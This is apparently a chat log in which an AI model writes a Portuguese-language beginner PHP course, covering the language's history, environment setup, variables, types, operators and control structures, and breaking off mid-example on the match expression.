## A linha do tempo completa

| Versão | Ano | Marco principal |
|---|---|---|
| PHP Tools | 1994 | Scripts pessoais de Rasmus Lerdorf |
| PHP 2 | 1997 | Formulários, comunicação com bancos de dados |
| PHP 3 | 1998 | Primeira linguagem de verdade — Suraski & Gutmans |
| PHP 4 | 2000 | Zend Engine 1, explosão do stack LAMP |
| PHP 5 | 2004 | OOP completa, frameworks sérios surgem |
| PHP 7 | 2015 | Zend Engine 3, performance 2x, tipagem |
| PHP 8.0 | 2020 | JIT, match, named args, attributes |
| PHP 8.1 | 2021 | Enums, fibers, readonly, intersection types |
| PHP 8.2 | 2022 | Readonly classes, DNF types, true/false/null types |
| PHP 8.3 | 2023 | Typed class constants, json_validate(), melhorias em readonly |
| PHP 8.4 | 2024 | Property hooks, lazy objects, melhorias em arrays |

---

## O que essa história nos ensina

A trajetória do PHP é uma lição sobre evolução pragmática. A linguagem nunca foi projetada de cima para baixo com perfeição acadêmica — ela cresceu respondendo a necessidades reais, cometeu erros, aprendeu com eles e se reinventou. Quem a critica com base no PHP de 2003 está cometendo o mesmo erro de julgar um arquiteto pelo primeiro rabisco que fez aos vinte anos.

Aprender PHP hoje significa aprender uma linguagem moderna, com décadas de lições incorporadas em seu design. E significa também entender um ecossistema enorme de sistemas existentes que precisam de profissionais qualificados.

---

## Resumo

| Período | O que aconteceu |
|---|---|
| 1994–1997 | Scripts pessoais viram ferramenta pública |
| 1998–2003 | PHP 3/4 — explosão de popularidade e problemas de qualidade |
| 2004–2014 | PHP 5 — maturidade OOP, frameworks, comunidade organizada |
| 2015–2019 | PHP 7 — ressurreição: performance e tipagem moderna |
| 2020–hoje | PHP 8 — linguagem moderna, expressiva e competitiva |

---

## Referências e leituras para aprofundar

- **Manual oficial do PHP** — Histórico de versões e changelogs completos: https://www.php.net/ChangeLog-8.php

- **"PHP: a fractal of bad design"** — O artigo crítico mais famoso sobre PHP, escrito em 2012 (baseado no PHP 5). Vale ler para entender as críticas históricas e avaliar quais ainda se aplicam: https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/

- **"PHP in 2024"** — Resposta moderna às críticas, com dados atualizados: https://stitcher.io/blog/php-in-2024

- **Zeev Suraski — The Secret History of PHP** — Palestra do cocriador do Zend Engine contando a história em primeira pessoa (YouTube): https://www.youtube.com/watch?v=APoz6nEJpyI

- **LERDORF, Rasmus. "PHP/FI — Personal Home Page / Forms Interpreter"** — O anúncio original de 1995 na Usenet, disponível em: https://groups.google.com/g/comp.infosystems.www.authoring.cgi/c/PyJ25gZ6z7A

- **TATROE, K.; MACINTYRE, P.** *Programming PHP*, 4ª ed. O'Reilly Media, 2020. Capítulo 1: History of PHP. Disponível em: https://www.oreilly.com/library/view/programming-php-4th/9781492054122/

---

**No próximo artigo:** Configurando o ambiente de desenvolvimento — PHP, editor, terminal e seu primeiro arquivo `.php` rodando.

---

Gerando o HTML agora.

Artigo 02 entregue — texto acima e HTML aqui.

**O que há de novo neste artigo:**
- **Timeline visual** no HTML — cada era do PHP com marcador destacado
- **Referências com URL visível** tanto no texto quanto no HTML, todas clicáveis e categorizadas (Documentação, Vídeo, Artigo, Histórico, Livro)
- **Comparação de código** PHP 5 vs PHP 8 com syntax highlight
- Exercícios que conectam diretamente às referências

Diga **"Continue"** para o Artigo 03 — *Configurando o Ambiente de Desenvolvimento*.

---

# you asked

message time: 2026-03-06 00:02:22

Continue

---

# claude response

# Artigo 03 — Configurando o Ambiente de Desenvolvimento

**Módulo 1 · Semana 3 · Nível: Iniciante**

---

## Introdução

Antes de escrever qualquer programa, você precisa de um lugar onde o PHP possa rodar. Esse lugar é o seu ambiente de desenvolvimento — a combinação de ferramentas instaladas na sua máquina que permite escrever, executar e depurar código PHP. Configurar esse ambiente corretamente desde o início poupa horas de frustração no futuro.

Neste artigo vamos instalar o PHP, conhecer o servidor embutido, escolher um editor de código, entender a estrutura básica de um arquivo PHP e rodar nosso primeiro programa de verdade.

---

## Instalando o PHP

A instalação varia conforme o sistema operacional. Em todos os casos, o objetivo é ter o comando `php` disponível no terminal.

**Linux (Ubuntu/Debian):**

```bash
sudo apt update
sudo apt install php php-cli php-mbstring php-xml php-curl
```

**macOS (com Homebrew):**

```bash
brew install php
```

Se você não tem o Homebrew instalado, acesse https://brew.sh e siga as instruções — é o gerenciador de pacotes padrão para macOS.

**Windows:**

A forma mais direta é instalar o **XAMPP**, disponível em https://www.apachefriends.org. Ele inclui PHP, Apache e MySQL em um único instalador com interface gráfica. Após a instalação, adicione o caminho do PHP ao PATH do sistema para usar o comando `php` no terminal.

Alternativamente, baixe o PHP diretamente em https://windows.php.net/download e siga as instruções de configuração manual do PATH.

Após qualquer instalação, abra o terminal e confirme:

```bash
php --version
```

A saída deve mostrar algo como `PHP 8.3.x (cli)`. Se apareceu, está funcionando.

---

## O servidor embutido do PHP

Para desenvolvimento local, o PHP possui um servidor web embutido que elimina a necessidade de instalar Apache ou Nginx. Você aponta para uma pasta e ele serve os arquivos PHP diretamente:

```bash
# Navegue até a pasta do projeto
cd meu-projeto

# Inicie o servidor na porta 8000
php -S localhost:8000
```

Abra o navegador em `http://localhost:8000`. O PHP servirá os arquivos da pasta atual. Para encerrar, pressione `Ctrl + C` no terminal.

Você também pode especificar um arquivo de entrada específico, útil quando há um ponto de entrada único:

```bash
# Usar index.php como ponto de entrada para todas as requisições
php -S localhost:8000 index.php
```

Esse servidor é suficiente para os Módulos 1 a 5 desta série. Nos módulos avançados, usaremos Docker para ambientes mais próximos da produção real.

---

## Escolhendo o editor de código

Você pode escrever PHP em qualquer editor de texto, mas ferramentas certas aumentam a produtividade de forma significativa.

**VS Code** é a escolha mais popular e a recomendada para esta série. Gratuito, extensível e com excelente suporte a PHP. Baixe em https://code.visualstudio.com e instale as extensões:

- **PHP Intelephense** — autocomplete inteligente, navegação de código, detecção de erros em tempo real
- **PHP Debug** — integração com Xdebug para depuração com breakpoints
- **PHP CS Fixer** — formata o código automaticamente seguindo os padrões PSR

**PhpStorm** é o IDE profissional mais completo para PHP, desenvolvido pela JetBrains. Disponível em https://www.jetbrains.com/phpstorm. É pago, com período de avaliação de 30 dias. Oferece recursos avançados que fazem diferença em projetos grandes. Vale considerar quando você estiver no Módulo 7 em diante.

Para esta série, VS Code com Intelephense atende muito bem.

---

## Estrutura de um arquivo PHP

Um arquivo PHP tem extensão `.php`. Dentro dele, você pode escrever HTML puro, PHP puro, ou misturar os dois. O código PHP sempre fica dentro das tags de abertura e fechamento:

```php
<?php
// Código PHP aqui
?>
```

Quando o arquivo contém apenas PHP — sem HTML —, a boa prática é omitir a tag de fechamento `?>`. Isso evita que espaços em branco acidentais sejam enviados ao navegador antes dos headers HTTP, o que causa erros em redirecionamentos e cookies.

```php
<?php
// Arquivo puramente PHP: sem tag de fechamento no final
// Isso é um padrão da comunidade — siga sempre

echo "Olá, mundo!";
```

---

## Seu primeiro programa

Crie uma pasta chamada `php-curso` e dentro dela um arquivo `index.php` com o seguinte conteúdo:

```php
<?php

// echo envia texto para a saída — navegador ou terminal
echo "Olá, Mundo!\n";

// Expressões matemáticas são avaliadas antes de serem exibidas
echo 2 + 2;
echo "\n";

// date() é uma função nativa que formata a data atual
// "d/m/Y" = dia/mês/ano com quatro dígitos
echo "Hoje é: " . date("d/m/Y");
echo "\n";

// phpinfo() exibe informações completas sobre a instalação do PHP
// Extremamente útil para diagnóstico — mas nunca deixe em produção
// phpinfo();
```

No terminal, dentro da pasta `php-curso`, rode:

```bash
php index.php
```

Saída esperada:

```
Olá, Mundo!
4
Hoje é: 05/03/2026
```

Você pode também iniciar o servidor embutido e acessar pelo navegador — o resultado será o mesmo conteúdo, mas sem quebras de linha visíveis, pois o navegador interpreta HTML, e `\n` não é uma quebra de linha em HTML (para isso seria necessário `<br>`).

---

## Misturando PHP com HTML

Quando rodando no servidor web, o PHP gera HTML. Essa é a forma mais comum de usar PHP em projetos web tradicionais:

```php
<?php
// Definimos as variáveis no início do arquivo — antes de qualquer HTML
$nome = "Ricardo";
$data = date("d/m/Y");
$hora = date("H:i");
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Meu primeiro PHP</title>
</head>
<body>
    <h1>Bem-vindo, <?= $nome ?>!</h1>

    <!--
        <?= $variavel ?> é um atalho para <?php echo $variavel; ?>
        Use-o em templates HTML para manter o código mais limpo
    -->
    <p>Hoje é <?= $data ?>, são <?= $hora ?>.</p>

</body>
</html>
```

O `<?=` é chamado de *short echo tag*. É um atalho para `<?php echo`. Use-o em arquivos de template onde PHP e HTML se misturam com frequência — o código fica mais limpo e legível.

---

## Depurando com var_dump e print_r

Dois dos comandos mais úteis para inspecionar valores durante o desenvolvimento:

```php
<?php

$nome  = "Ana";
$idade = 28;
$ativo = true;
$notas = [9.5, 8.0, 7.5];

// echo exibe o valor como string — simples, mas sem informação de tipo
echo $nome;
echo "\n";

// var_dump exibe o tipo e o valor — essencial para depuração
// Mostra: string(3) "Ana"
var_dump($nome);

// var_dump em booleano mostra true ou false com o tipo
// Mostra: bool(true)
var_dump($ativo);

// var_dump em array mostra toda a estrutura com tipos
var_dump($notas);

// print_r exibe arrays e objetos de forma mais legível para humanos
// Menos verboso que var_dump — bom para estruturas complexas
print_r($notas);
```

Saída de `var_dump($notas)`:

```
array(3) {
  [0] => float(9.5)
  [1] => float(8)
  [2] => float(7.5)
}
```

Saída de `print_r($notas)`:

```
Array
(
    [0] => 9.5
    [1] => 8
    [2] => 7.5
)
```

Use `var_dump` quando precisar saber o tipo exato. Use `print_r` quando só precisar ver a estrutura dos dados.

---

## Boas práticas desde o início

Alguns hábitos que farão diferença ao longo de toda a sua carreira:

**Use UTF-8 sempre.** Declare `charset=UTF-8` em seus HTMLs e salve seus arquivos em UTF-8 no editor. Isso evita problemas com acentuação que são frustrantes de diagnosticar.

**Omita a tag de fechamento `?>` em arquivos puramente PHP.** É um padrão do PSR-12, o guia de estilo oficial da comunidade PHP.

**Use 4 espaços por nível de indentação.** Também é definido pelo PSR-12. Configure seu editor para inserir espaços automaticamente ao pressionar Tab.

**Nomeie variáveis com clareza.** `$nomeDoUsuario` é infinitamente melhor que `$n`. Código é lido muito mais do que escrito — clareza é respeito pelo seu eu futuro, e por quem trabalhar com você.

**Um arquivo, uma responsabilidade.** Desde cedo, evite arquivos PHP gigantes que fazem tudo ao mesmo tempo. Separar responsabilidades é o fundamento de todo bom design de software.

---

## Resumo

| Tópico | O que aprendemos |
|---|---|
| Instalação | `apt`, `brew` ou XAMPP dependendo do sistema operacional |
| Servidor embutido | `php -S localhost:8000` para desenvolvimento local |
| Editor recomendado | VS Code com extensão PHP Intelephense |
| Estrutura do arquivo | `<?php ... ?>` ou `<?= ... ?>` para atalho de echo |
| Primeiro programa | `echo`, `date()`, mistura de PHP com HTML |
| Depuração | `var_dump()` para tipo + valor, `print_r()` para estruturas |
| Boas práticas | UTF-8, sem `?>` final, 4 espaços, nomes claros |

---

## Referências e leituras para aprofundar

- **PHP — Instalação e configuração oficial**
  https://www.php.net/manual/pt_BR/install.php
  Documentação oficial cobrindo instalação em todos os sistemas operacionais, com detalhes sobre extensões e configuração do `php.ini`.

- **Homebrew — Gerenciador de pacotes para macOS**
  https://brew.sh
  Indispensável para desenvolvedores em macOS. Facilita a instalação e atualização do PHP e de centenas de outras ferramentas.

- **XAMPP — Apache Friends**
  https://www.apachefriends.org
  Ambiente de desenvolvimento completo para Windows, macOS e Linux. Inclui PHP, Apache, MySQL e phpMyAdmin.

- **VS Code — Download oficial**
  https://code.visualstudio.com
  Editor gratuito da Microsoft. Após instalar, busque "PHP Intelephense" na aba de extensões.

- **PHP Intelephense — Extensão VS Code**
  https://marketplace.visualstudio.com/items?itemName=bmewburn.vscode-intelephense-client
  A extensão PHP mais completa para VS Code. Autocomplete preciso, detecção de erros em tempo real, navegação de código e muito mais.

- **PSR-12: Extended Coding Style**
  https://www.php-fig.org/psr/psr-12/
  O padrão oficial de estilo de código da comunidade PHP. Cobre indentação, espaçamento, nomenclatura e muito mais. Vale uma leitura rápida já nesta semana.

- **PhpStorm — JetBrains**
  https://www.jetbrains.com/phpstorm/
  IDE profissional para PHP. Considere quando avançar para os módulos de frameworks e projetos maiores.

---

**No próximo artigo:** Variáveis, tipos de dados e operadores — a base de toda lógica PHP.

---

Gerando o HTML agora.

Artigo 03 entregue — texto acima e HTML aqui.

**Novidades neste artigo:**
- **Abas interativas Linux / macOS / Windows** — o leitor clica no seu sistema e vê apenas o comando certo
- **Cards de ferramentas** com links, badges e descrições
- **Checklist visual** para boas práticas e extensões
- Referências com URL visível e clicável como nos artigos anteriores

Diga **"Continue"** para o Artigo 04 — *Variáveis, Tipos de Dados e Operadores*.

---

# you asked

message time: 2026-03-06 00:11:20

Continue

---

# claude response

# Artigo 04 — Variáveis, Tipos de Dados e Operadores

**Módulo 1 · Semana 4 · Nível: Iniciante**

---

## Introdução

Todo programa de computador, em sua essência, faz três coisas: recebe dados, processa dados e produz resultados. Para isso, precisa de um lugar para guardar informações temporariamente durante a execução — e esse lugar são as variáveis. Neste artigo vamos entender como o PHP lida com variáveis, quais tipos de dados existem, como convertê-los e como operar sobre eles com os operadores da linguagem.

Este é um dos artigos mais densos do Módulo 1, mas também um dos mais importantes. Tudo que vem depois — estruturas de controle, funções, orientação a objetos — depende de você dominar bem este conteúdo.

---

## Variáveis

No PHP, toda variável começa com o símbolo `$` seguido do nome. O nome deve começar com uma letra ou underscore, e pode conter letras, números e underscores. O PHP é case-sensitive: `$nome` e `$Nome` são variáveis diferentes.

```php
<?php

// Declaração e atribuição são feitas ao mesmo tempo
// Não existe "declarar sem valor" em PHP como em outras linguagens
$nome     = "Ricardo";
$idade    = 35;
$altura   = 1.78;
$ativo    = true;
$endereco = null; // null significa ausência intencional de valor

// Variáveis podem ser reatribuídas a qualquer momento
// e até mudar de tipo — PHP permite isso (tipagem dinâmica)
$valor = 10;      // int
$valor = "dez";   // agora é string — PHP aceita, mas evite isso
$valor = 10.5;    // agora é float

// Exibindo valores
echo $nome;   // Ricardo
echo "\n";
echo $idade;  // 35
```

A convenção de nomenclatura mais usada no PHP é o **camelCase** para variáveis e funções: `$nomeDoUsuario`, `$totalDeItens`, `$dataDeNascimento`. Para constantes, usa-se `UPPER_SNAKE_CASE`. Siga essas convenções — elas tornam o código previsível e legível.

---

## Tipos de dados

O PHP possui oito tipos primitivos divididos em três grupos:

**Escalares** — armazenam um único valor:
- `string` — texto
- `int` — número inteiro
- `float` — número decimal
- `bool` — verdadeiro ou falso

**Compostos** — armazenam múltiplos valores:
- `array` — lista ou mapa de valores
- `object` — instância de uma classe

**Especiais:**
- `null` — ausência de valor
- `resource` — referência a recursos externos (arquivos, conexões de banco)

```php
<?php

// STRING — sequência de caracteres
// Aspas duplas: interpola variáveis
// Aspas simples: tudo literal, mais performático para strings sem variáveis
$simples  = 'Olá, mundo!';             // aspas simples
$duplas   = "Olá, $simples";           // interpola — resultado: "Olá, Olá, mundo!"
$heredoc  = <<<EOT
    Texto com múltiplas linhas.
    Suporta interpolação de $simples.
    EOT;                               // heredoc — para textos longos

// INT — inteiro, positivo ou negativo, sem limite fixo (depende do sistema)
$positivo  =  42;
$negativo  = -17;
$hexadec   = 0x1A;  // hexadecimal — equivale a 26
$binario   = 0b101; // binário — equivale a 5
$octal     = 0777;  // octal — equivale a 511
$separador = 1_000_000; // PHP 7.4+: underscore como separador visual

// FLOAT — número com ponto decimal ou notação científica
$preco     = 19.99;
$cientifico = 1.5e3;  // 1500.0
$negativo_f = -0.001;

// BOOL — true ou false (case-insensitive: TRUE, True, true são iguais)
$ativo    = true;
$inativo  = false;

// NULL — ausência de valor
$vazio = null;

// Verificando tipos com gettype() e funções is_*
echo gettype($positivo);  // integer
echo gettype($preco);     // double (nome interno do float)
echo gettype($simples);   // string
echo gettype($ativo);     // boolean
echo gettype($vazio);     // NULL

var_dump(is_int($positivo));    // bool(true)
var_dump(is_string($simples));  // bool(true)
var_dump(is_null($vazio));      // bool(true)
```

---

## Strings em detalhes

Strings merecem atenção especial pois são o tipo mais usado no desenvolvimento web.

```php
<?php

$nome  = "Ana";
$sobrenome = "Silva";

// Concatenação com ponto (.)
$nomeCompleto = $nome . " " . $sobrenome;
echo $nomeCompleto; // Ana Silva

// Interpolação dentro de aspas duplas
echo "Olá, $nome!";          // Olá, Ana!
echo "Olá, {$nome}!";        // Olá, Ana! — chaves deixam o limite da variável claro

// Funções essenciais de string
echo strlen($nome);           // 3 — comprimento
echo strtoupper($nome);       // ANA — maiúsculas
echo strtolower($nome);       // ana — minúsculas
echo str_replace("Ana", "Maria", $nomeCompleto); // Maria Silva
echo substr($nomeCompleto, 0, 3); // Ana — extrai parte da string
echo strpos($nomeCompleto, "Silva"); // 4 — posição da substring
echo trim("  espaços  ");     // "espaços" — remove espaços nas bordas
echo str_pad("5", 3, "0", STR_PAD_LEFT); // "005" — preenchimento

// Verificando conteúdo
var_dump(str_contains($nomeCompleto, "Silva")); // bool(true) — PHP 8+
var_dump(str_starts_with($nomeCompleto, "Ana")); // bool(true) — PHP 8+
var_dump(str_ends_with($nomeCompleto, "Silva")); // bool(true) — PHP 8+
```

---

## Conversão de tipos (Type Casting)

O PHP converte tipos automaticamente em muitos contextos — isso se chama coerção de tipos. Mas você também pode fazer conversões explícitas, o que é sempre mais seguro e legível.

```php
<?php

// Conversão implícita (automática) — PHP decide o tipo
$resultado = "5" + 3;     // PHP converte "5" para int — resultado: 8
$resultado = "5 anos" + 3; // PHP pega o número do início — resultado: 8
$resultado = "anos" + 3;   // string sem número vira 0 — resultado: 3

// Conversão explícita (casting) — você decide — sempre prefira isso
$texto   = "42";
$inteiro = (int) $texto;    // 42 como int
$decimal = (float) $texto;  // 42.0 como float
$bool    = (bool) $texto;   // true (string não-vazia = true)

// Regras importantes do casting para bool:
// São considerados FALSE: 0, 0.0, "", "0", [], null
// Todo o resto é TRUE
var_dump((bool) 0);      // bool(false)
var_dump((bool) "");     // bool(false)
var_dump((bool) "0");    // bool(false) — armadilha!
var_dump((bool) []);     // bool(false)
var_dump((bool) "false"); // bool(true) — a string "false" não é false!

// Funções de conversão — mais explícitas que casting
$numero = intval("42abc");   // 42 — para inteiro
$decimal = floatval("3.14"); // 3.14 — para float
$texto = strval(100);        // "100" — para string
```

A linha `(bool) "false"` retornando `true` é uma das maiores armadilhas para iniciantes. Lembre-se: o PHP avalia se a string está vazia ou é `"0"` — não avalia o conteúdo semântico.

---

## Constantes

Constantes são como variáveis, mas seu valor não pode ser alterado após a definição. São definidas com `define()` ou com a palavra-chave `const`:

```php
<?php

// define() — pode ser usado em qualquer ponto do código
define('VERSAO_APP', '2.1.0');
define('MAX_TENTATIVAS', 3);
define('PI', 3.14159);

// const — deve ser usada no escopo global ou dentro de classes
const NOME_EMPRESA = 'Minha Empresa Ltda';

echo VERSAO_APP;    // 2.1.0 — sem o $
echo MAX_TENTATIVAS; // 3

// Constantes predefinidas pelo PHP
echo PHP_VERSION;   // versão do PHP instalado
echo PHP_INT_MAX;   // maior inteiro suportado
echo PHP_EOL;       // quebra de linha do sistema operacional
echo PHP_MAJOR_VERSION; // número da versão maior (8, no PHP 8.x)
echo __FILE__;      // caminho completo do arquivo atual
echo __LINE__;      // número da linha atual — útil para debug
```

Use constantes para valores que não devem mudar ao longo da execução: versões, limites, nomes de configuração, caminhos base. Isso torna o código mais seguro e mais fácil de manter.

---

## Operadores

Operadores são símbolos que realizam operações sobre um ou mais valores. O PHP tem um conjunto rico de operadores.

### Operadores aritméticos

```php
<?php

$a = 10;
$b = 3;

echo $a + $b;   // 13 — adição
echo $a - $b;   // 7  — subtração
echo $a * $b;   // 30 — multiplicação
echo $a / $b;   // 3.333... — divisão (resultado sempre float se não divisível)
echo $a % $b;   // 1  — módulo (resto da divisão)
echo $a ** $b;  // 1000 — exponenciação (PHP 5.6+)

// Operadores de incremento e decremento
$contador = 0;
$contador++;    // pós-incremento: usa o valor DEPOIS incrementa
++$contador;    // pré-incremento: incrementa ANTES de usar o valor
$contador--;    // pós-decremento
--$contador;    // pré-decremento

// Operadores de atribuição combinados — atalhos
$total = 100;
$total += 50;   // equivale a $total = $total + 50  → 150
$total -= 30;   // equivale a $total = $total - 30  → 120
$total *= 2;    // equivale a $total = $total * 2   → 240
$total /= 4;    // equivale a $total = $total / 4   → 60
$total %= 7;    // equivale a $total = $total % 7   → 4
$texto  = "Olá";
$texto .= ", mundo!"; // concatenação combinada → "Olá, mundo!"
```

### Operadores de comparação

```php
<?php

$a = 10;
$b = "10";

// == comparação frouxa (loose) — compara valor, ignora tipo
var_dump($a == $b);   // bool(true) — 10 == "10" após coerção

// === comparação estrita — compara valor E tipo
var_dump($a === $b);  // bool(false) — int !== string

// != diferente (frouxa)
var_dump($a != 5);    // bool(true)

// !== diferente estrita
var_dump($a !== $b);  // bool(true) — tipos diferentes

// Comparações numéricas
var_dump($a > 5);     // bool(true)
var_dump($a < 5);     // bool(false)
var_dump($a >= 10);   // bool(true)
var_dump($a <= 10);   // bool(true)

// Spaceship operator <=> — PHP 7+
// Retorna -1, 0 ou 1 dependendo da comparação
// Muito usado em funções de ordenação
echo (1 <=> 2);   // -1 (esquerda menor)
echo (2 <=> 2);   //  0 (iguais)
echo (3 <=> 2);   //  1 (esquerda maior)
```

Sempre prefira `===` ao `==`. A comparação frouxa tem regras de coerção complexas que causam bugs sutis e difíceis de encontrar.

### Operadores lógicos

```php
<?php

$idade    = 25;
$cadastro = true;

// && e || são os operadores lógicos modernos (preferidos)
var_dump($idade >= 18 && $cadastro);  // bool(true) — E lógico
var_dump($idade < 18 || $cadastro);   // bool(true) — OU lógico
var_dump(!$cadastro);                  // bool(false) — NÃO lógico

// and, or, not existem mas têm precedência MENOR que &&, ||
// Isso causa comportamento inesperado em expressões complexas
// Prefira sempre && e || para evitar surpresas
$x = true && false;  // $x = (true && false) = false — correto
$x = true and false; // $x = true, depois "and false" é ignorado — armadilha!
```

### Operadores específicos do PHP

```php
<?php

// Null coalescing (??) — PHP 7+
// Retorna o operando esquerdo se não for null, senão retorna o direito
$nome = null;
$exibir = $nome ?? "Visitante"; // "Visitante"

// Encadeamento: pega o primeiro valor não-null
$a = null;
$b = null;
$c = "Ricardo";
echo $a ?? $b ?? $c; // "Ricardo"

// Null coalescing de atribuição (??=) — PHP 7.4+
$config = [];
$config['tema'] ??= 'claro'; // só atribui se for null
echo $config['tema']; // "claro"

// Operador ternário
$idade = 20;
$status = ($idade >= 18) ? "maior" : "menor";
echo $status; // "maior"

// Ternário curto (Elvis operator) — retorna o próprio valor se truthy
$entrada = "" ;
$valor = $entrada ?: "padrão"; // como $entrada é falsy, usa "padrão"
echo $valor; // "padrão"

// Nullsafe operator (?->) — PHP 8+
// Evita erros ao chamar métodos em objetos possivelmente null
// $resultado = $usuario?->getPerfil()?->getAvatar();
// Se qualquer parte for null, retorna null em vez de erro
```

---

## Resumo

| Tópico | Ponto principal |
|---|---|
| Variáveis | Sempre com `$`, camelCase, tipagem dinâmica |
| Tipos escalares | string, int, float, bool |
| Tipos especiais | null, array, object, resource |
| Strings | Aspas simples (literal) vs duplas (interpola variáveis) |
| Casting | Prefira casting explícito `(int)`, `(string)` etc. |
| `(bool) "false"` | Retorna `true` — armadilha clássica |
| Constantes | `define()` ou `const`, sem `$`, UPPER_SNAKE_CASE |
| Comparação | Sempre `===` em vez de `==` |
| Null coalescing | `??` para valores padrão quando null |
| Nullsafe | `?->` para encadeamento seguro em PHP 8 |

---

## Referências e leituras para aprofundar

- **Tipos suportados — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.types.php
  Documentação completa de todos os tipos do PHP, com exemplos e detalhes de comportamento em cada situação.

- **Operadores — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.operators.php
  Referência completa de todos os operadores, incluindo precedência e associatividade.

- **Comparações de tipos — Tabelas de comparação do PHP**
  https://www.php.net/manual/pt_BR/types.comparisons.php
  Tabelas mostrando o resultado de `==` e `===` para todas as combinações de tipos. Bookmarque esta página.

- **PHP 8 — Nullsafe operator RFC**
  https://wiki.php.net/rfc/nullsafe_operator
  A proposta formal que introduziu o operador `?->` no PHP 8. Leitura interessante para entender a motivação por trás do recurso.

- **FOWLER, Martin.** *Refactoring: Improving the Design of Existing Code*. 2ª ed. Addison-Wesley, 2018.
  https://martinfowler.com/books/refactoring.html
  Não é sobre PHP especificamente, mas o capítulo sobre variáveis e nomenclatura é fundamental para qualquer desenvolvedor.

- **PHP: The Right Way — Tipos e boas práticas**
  https://phptherightway.com/#language_highlights
  Seção sobre características da linguagem com foco em boas práticas modernas.

---

**No próximo artigo:** Estruturas de controle — `if`, `else`, `elseif`, `match` e `switch`.

---

Gerando o HTML agora.

Artigo 04 entregue — texto acima e HTML aqui.

**Novidades neste artigo:**
- **Cards visuais de tipos** agrupados por categoria (Escalares, Compostos, Especiais)
- **Box vermelho de perigo** para armadilhas críticas como `(bool) "false"`
- Cobertura completa de operadores: aritméticos, comparação estrita vs frouxa, `??`, `?:`, `?->`
- Desafio prático com IMC integrando múltiplos conceitos do artigo

Diga **"Continue"** para o Artigo 05 — *Estruturas de Controle: if, else, elseif, match e switch*.

---

# you asked

message time: 2026-03-06 03:26:02

Continue

---

# claude response

# Artigo 05 — Estruturas de Controle

**Módulo 1 · Semana 5 · Nível: Iniciante**

---

## Introdução

Um programa que executa sempre as mesmas instruções na mesma ordem é pouco útil. O que torna o software poderoso é a capacidade de tomar decisões — executar um bloco de código em determinada situação e outro bloco em situação diferente. Isso é feito com estruturas de controle.

Neste artigo vamos estudar as principais estruturas de decisão do PHP: `if`, `else`, `elseif`, `switch` e o `match` — introduzido no PHP 8 e que representa uma forma muito mais segura e expressiva de lidar com múltiplas condições.

---

## if, else e elseif

A estrutura `if` é a mais fundamental de todas. Ela avalia uma condição e executa um bloco de código se essa condição for verdadeira.

```php
<?php

$idade = 20;

// if básico — executa o bloco se a condição for true
if ($idade >= 18) {
    echo "Maior de idade.";
}

// if + else — executa um bloco ou outro
if ($idade >= 18) {
    echo "Maior de idade.";
} else {
    echo "Menor de idade.";
}

// if + elseif + else — múltiplas condições em sequência
// O PHP avalia cada condição de cima para baixo
// e executa apenas o primeiro bloco verdadeiro
$nota = 75;

if ($nota >= 90) {
    echo "Conceito A";
} elseif ($nota >= 75) {
    echo "Conceito B";    // este será executado
} elseif ($nota >= 60) {
    echo "Conceito C";
} else {
    echo "Reprovado";
}
```

Uma regra importante: quando o `if` tem apenas uma instrução, as chaves são opcionais. Mas omiti-las é uma prática que gera bugs difíceis de encontrar — sempre use chaves, sem exceção.

```php
<?php

$logado = true;

// Sem chaves — funciona, mas é perigoso
if ($logado)
    echo "Bem-vindo!";

// Com chaves — sempre preferível
// Se você adicionar uma linha depois, ela será executada independentemente da condição
if ($logado) {
    echo "Bem-vindo!";
    echo "Seu painel está pronto.";
}
```

---

## Condições compostas

Na prática, raramente verificamos apenas uma condição. Usamos os operadores lógicos `&&` (E) e `||` (OU) para combinar condições:

```php
<?php

$idade     = 25;
$documento = true;
$pagamento = true;

// && (E) — todas as condições precisam ser verdadeiras
if ($idade >= 18 && $documento && $pagamento) {
    echo "Acesso liberado.";
}

// || (OU) — basta uma condição ser verdadeira
$ehAdmin    = false;
$ehModerador = true;

if ($ehAdmin || $ehModerador) {
    echo "Pode moderar conteúdo.";
}

// Combinando && e || — use parênteses para deixar a precedência clara
// Sem parênteses a leitura fica ambígua e propensa a erros
$planoAtivo  = true;
$dentroDoLimite = true;
$ehPremium   = false;

// Parênteses explicitam a intenção: (plano ativo E dentro do limite) OU é premium
if (($planoAtivo && $dentroDoLimite) || $ehPremium) {
    echo "Requisição permitida.";
}
```

---

## O operador ternário em condições simples

Para atribuições condicionais simples, o operador ternário é uma alternativa compacta ao `if/else`:

```php
<?php

$pontos = 450;

// if/else convencional
if ($pontos >= 500) {
    $nivel = "Ouro";
} else {
    $nivel = "Prata";
}

// Ternário — equivalente, mais conciso para casos simples
$nivel = ($pontos >= 500) ? "Ouro" : "Prata";

echo $nivel; // Prata

// Evite ternários aninhados — tornam o código ilegível
// Ruim:
$categoria = ($pontos >= 1000) ? "Platina" : (($pontos >= 500) ? "Ouro" : "Prata");

// Melhor: use if/elseif para múltiplos casos
if ($pontos >= 1000) {
    $categoria = "Platina";
} elseif ($pontos >= 500) {
    $categoria = "Ouro";
} else {
    $categoria = "Prata";
}
```

---

## switch

O `switch` compara uma expressão com múltiplos valores possíveis. É uma alternativa ao `if/elseif` quando você precisa comparar a mesma variável com vários valores diferentes:

```php
<?php

$diaDaSemana = 3;

switch ($diaDaSemana) {
    case 1:
        echo "Segunda-feira";
        break; // break interrompe o switch — sem ele, a execução "cai" para o próximo case

    case 2:
        echo "Terça-feira";
        break;

    case 3:
        echo "Quarta-feira"; // este será executado
        break;

    case 4:
        echo "Quinta-feira";
        break;

    case 5:
        echo "Sexta-feira";
        break;

    case 6:
    case 7:
        // Múltiplos cases sem break — executa o mesmo bloco para ambos
        echo "Final de semana";
        break;

    default:
        // default é executado se nenhum case corresponder
        echo "Dia inválido";
        break;
}
```

O `switch` usa comparação frouxa (`==`) internamente — mais um motivo para preferi-lo apenas em situações adequadas e migrar para `match` quando possível.

---

## match — a evolução do switch

Introduzido no PHP 8.0, o `match` resolve os principais problemas do `switch`:

- Usa comparação **estrita** (`===`) — sem surpresas de coerção de tipos
- **Não precisa de `break`** — cada braço retorna um valor e encerra automaticamente
- É uma **expressão** — pode ser atribuído a uma variável diretamente
- Lança `UnhandledMatchError` se nenhum braço corresponder — falha explicitamente em vez de silenciosamente

```php
<?php

$status = 2;

// match como expressão — retorna um valor
$descricao = match($status) {
    1       => "Pendente",
    2       => "Aprovado",     // este será retornado
